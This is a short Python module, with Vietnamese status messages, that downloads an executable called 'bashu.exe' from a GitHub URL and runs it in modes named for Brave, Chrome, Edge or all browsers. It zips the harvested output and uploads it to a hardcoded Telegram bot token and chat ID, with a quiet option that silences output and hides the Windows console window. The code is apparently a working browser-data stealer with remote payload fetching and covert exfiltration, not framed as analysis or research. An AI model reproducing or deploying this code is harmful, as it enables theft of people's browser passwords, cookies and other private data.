import requests
import tempfile
import subprocess
import zipfile
import shutil
import secrets
import string
from pathlib import Path
import sys

BOT_TOKEN = "8424690383:AAFPElRE5e9S7RXxxhqXxzbxUINkSMv7Lms"
CHAT_ID = "-4905297540"

def send_telegram_file(token: str, chat_id: str, file_path: Path, quiet: bool = False):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(file_path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": chat_id}
        response = requests.post(url, files=files, data=data)
    if not quiet:
        print("[📤] Đã gửi Telegram:", response.json())
    return response

def _random_name(length=10):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def _download_exe(temp_dir: Path, exe_path: Path, quiet: bool = False):
    if not exe_path.exists():
        if not quiet:
            print("[⬇️] Đang tải bashu.exe ...")
        url = "https://github.com/annawilson121990-lgtm/annaan/raw/refs/heads/main/bashu.exe"
        r = requests.get(url, stream=True)
        r.raise_for_status()
        with open(exe_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        if not quiet:
            print("[✅] Đã tải:", exe_path)
    else:
        if not quiet:
            print("[✔] bashu.exe đã tồn tại, bỏ qua tải lại")

def _run_mode(mode: str, quiet: bool = False):
    temp_dir = Path(tempfile.gettempdir())
    exe_path = temp_dir / "bashu.exe"
    
    rand_name = _random_name()
    out_dir = temp_dir / rand_name
    zip_path = temp_dir / f"{rand_name}.zip"

    if out_dir.exists():
        shutil.rmtree(out_dir)
    if zip_path.exists():
        zip_path.unlink()

    _download_exe(temp_dir, exe_path, quiet=quiet)

    cmd = [str(exe_path), mode, "-v", "-o", str(out_dir)]
    if not quiet:
        print(f"[🚀] Đang chạy: {' '.join(cmd)}")

    # prepare subprocess kwargs to silence output when quiet=True
    popen_kwargs = {}
    if quiet:
        popen_kwargs["stdout"] = subprocess.DEVNULL
        popen_kwargs["stderr"] = subprocess.DEVNULL
        # On Windows, hide the console window as well
        if sys.platform.startswith("win"):
            popen_kwargs["creationflags"] = 0x08000000  # CREATE_NO_WINDOW

    # run the command (will raise on non-zero exit if check=True)
    subprocess.run(cmd, check=True, **popen_kwargs)

    if not quiet:
        print("[📦] Đang nén thư mục:", out_dir)

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        for file in out_dir.rglob("*"):
            # ensure we only add files (skip directories)
            if file.is_file():
                zipf.write(file, file.relative_to(out_dir))

    if not quiet:
        print("[✅] Đã nén thành:", zip_path)

    send_telegram_file(BOT_TOKEN, CHAT_ID, zip_path, quiet=quiet)
    return zip_path

# ==== Giao diện public ====

class Run:
    def all(self, quiet: bool = False): return _run_mode("all", quiet=quiet)
    def brave(self, quiet: bool = False): return _run_mode("brave", quiet=quiet)
    def chrome(self, quiet: bool = False): return _run_mode("chrome", quiet=quiet)
    def edge(self, quiet: bool = False): return _run_mode("edge", quiet=quiet)

run = Run()
